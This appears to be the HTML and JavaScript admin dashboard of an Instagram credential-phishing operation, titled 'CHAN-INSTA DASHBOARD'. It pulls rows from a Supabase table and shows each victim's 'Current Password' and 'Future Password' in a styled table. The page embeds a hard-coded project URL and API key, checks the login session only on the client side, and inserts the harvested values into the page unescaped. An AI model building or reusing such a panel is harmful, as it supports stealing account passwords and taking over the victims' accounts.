<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CHAN-INSTA DASHBOARD</title>
  
  <link rel="icon" type="image/x-icon" href="favicon.ico" />
  <link rel="icon" type="image/png" href="apple-touch-icon.png" />

  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

    body {
      font-family: 'Share Tech Mono', monospace;
      background-color: #020617;
      color: #00eaff;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 30px;
      overflow-x: hidden;
    }

    /* Animated grid background */
    body::before {
      content: "";
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: 
        linear-gradient(90deg, rgba(0,234,255,0.15) 1px, transparent 1px),
        linear-gradient(rgba(0,234,255,0.15) 1px, transparent 1px);
      background-size: 40px 40px;
      animation: moveGrid 12s linear infinite;
      z-index: 0;
    }

    @keyframes moveGrid {
      from { background-position: 0 0, 0 0; }
      to { background-position: 40px 40px, 40px 40px; }
    }

    header {
      text-align: center;
      margin-bottom: 30px;
      z-index: 1;
      position: relative;
    }

    header img {
      height: 80px;
      width: 80px;
      opacity: 0.7;
      margin-bottom: 10px;
    }

    header h2 {
      margin: 10px 0 0 0;
      font-size: 24px;
      text-shadow: 0 0 10px #00eaff;
      animation: flicker 3s infinite;
    }

    @keyframes flicker {
      0%,18%,22%,25%,53%,57%,100% { opacity: 1; }
      20%,24%,55% { opacity: 0.3; }
    }

    /* Responsive table container */
    .table-wrapper {
      width: 100%;
      overflow-x: auto;
      -webkit-overflow-scrolling: touch;
      border-radius: 8px;
      box-shadow: 0 0 30px rgba(0,234,255,0.1);
      position: relative;
      z-index: 1;
    }

    table {
      width: 100%;
      min-width: 600px;
      border-collapse: collapse;
      background: rgba(0,10,20,0.8);
      border: 1px solid rgba(0,234,255,0.3);
      border-radius: 8px;
    }

    th, td {
      padding: 12px 15px;
      text-align: left;
      border-bottom: 1px solid rgba(0,234,255,0.1);
    }

    th {
      background: rgba(0,234,255,0.1);
      text-transform: uppercase;
      font-size: 13px;
      letter-spacing: 1px;
      color: #00eaff;
    }

    td {
      color: #80ffff;
      word-break: break-word;
    }

    tr:hover {
      background: rgba(0,234,255,0.05);
      transition: 0.2s;
    }

    .table-wrapper::-webkit-scrollbar {
      height: 6px;
    }

    .table-wrapper::-webkit-scrollbar-thumb {
      background: rgba(0,234,255,0.4);
      border-radius: 4px;
    }

    ::-webkit-scrollbar {
      width: 6px;
    }

    ::-webkit-scrollbar-thumb {
      background: rgba(0,234,255,0.4);
      border-radius: 4px;
    }

    @media (max-width: 600px) {
      header h2 {
        font-size: 20px;
      }
      table th, table td {
        padding: 10px;
        font-size: 13px;
      }
    }
  </style>
</head>
<body>

  <header>
    <img src="logo.png" alt="Logo" class="logo" />
    <h2>CHAN-INSTA DASHBOARD</h2>
  </header>

  <div class="table-wrapper">
    <table id="userTable">
      <thead>
        <tr>
          <th>ID</th>
          <th>Current Password</th>
          <th>Future Password</th>
          <th>Created At</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>

  <script type="module">
    import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

    const supabaseUrl = 'https://cjwoizyfasbxbmtcmnpj.supabase.co';
    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImNqd29penlmYXNieGJtdGNtbnBqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE4MjQ5MzcsImV4cCI6MjA2NzQwMDkzN30.dwPcx-uCfixYxF-YAhZAdZR1VGkuOSI3sgCLeWX7xTM';
    const supabase = createClient(supabaseUrl, supabaseKey);

    // ✅ Instant auth check (hide until verified)
    async function checkAuth() {
      document.body.style.display = "none";
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        window.location.href = 'index.html';
      } else {
        document.body.style.display = "flex";
      }
    }

    checkAuth();

    // ✅ Load data
    async function loadUsers() {
      const { data, error } = await supabase
        .from('zero_cp')
        .select('id, op, fp, created_at')
        .order('created_at', { ascending: false });

      if (error) {
        alert('Error loading users');
        return;
      }

      const tbody = document.querySelector('#userTable tbody');
      tbody.innerHTML = '';
      data.forEach(user => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${user.id}</td>
          <td>${user.op || '-'}</td>
          <td>${user.fp || '-'}</td>
          <td>${new Date(user.created_at).toLocaleString()}</td>
        `;
        tbody.appendChild(tr);
      });
    }

    loadUsers();
  </script>

</body>
</html>
